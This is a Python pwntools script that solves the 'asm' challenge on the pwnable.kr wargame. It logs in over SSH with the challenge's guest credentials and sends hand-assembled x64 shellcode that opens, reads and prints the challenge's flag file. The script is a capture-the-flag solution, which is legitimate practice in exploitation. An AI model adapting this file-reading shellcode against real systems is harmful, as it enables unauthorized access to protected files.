#! /usr/bin/python

from pwn import *

HOST = "pwnable.kr"
PORT = 2222
USER = "asm"

shellcode = '\x48\x83\xEC\x20\xEB\x6B\x59\x48\x89\xCF\x48\x31\xF6\xB9\x56\x34' + \
	'\x12\x02\xC1\xE9\x18\x48\x89\xC8\x0F\x05\x48\x89\xC7\x48\x89\xE6' + \
	'\xB9\x56\x34\x12\x20\xC1\xE9\x18\x48\x89\xCA\x48\x31\xC0\x0F\x05' + \
	'\xB9\x67\x45\x23\x01\xC1\xE9\x18\x48\x89\xCF\x48\x89\xE6\xB9\x56' + \
	'\x34\x12\x20\xC1\xE9\x18\x48\x89\xCA\xB9\x67\x45\x23\x01\xC1\xE9' + \
	'\x18\x48\x89\xC8\x0F\x05\xB9\x56\x34\x12\x20\xC1\xE9\x18\x48\x01' + \
	'\xCC\xB9\x56\x34\x12\x3C\xC1\xE9\x18\x48\x89\xC8\x48\x31\xFF\x0F' + \
	'\x05\xE8\x90\xFF\xFF\xFF\x74\x68\x69\x73\x5F\x69\x73\x5F\x70\x77' + \
	'\x6E\x61\x62\x6C\x65\x2E\x6B\x72\x5F\x66\x6C\x61\x67\x5F\x66\x69' + \
	'\x6C\x65\x5F\x70\x6C\x65\x61\x73\x65\x5F\x72\x65\x61\x64\x5F\x74' + \
	'\x68\x69\x73\x5F\x66\x69\x6C\x65\x2E\x73\x6F\x72\x72\x79\x5F\x74' + \
	'\x68\x65\x5F\x66\x69\x6C\x65\x5F\x6E\x61\x6D\x65\x5F\x69\x73\x5F' + \
	'\x76\x65\x72\x79\x5F\x6C\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30' + \
	'\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F' + \
	'\x6F\x6F\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6F\x30' + \
        '\x6F\x30\x6F\x30\x6F\x30\x6F\x30\x6F\x30\x6F\x6E\x67\x00';

s = ssh(host=HOST, user=USER,
        port=PORT, password='guest')
p = s.connect_remote('localhost', 9026)

p.recvuntil('give me your x64 shellcode: ')
p.send((shellcode))
print p.recvline()

p.close()
s.close()
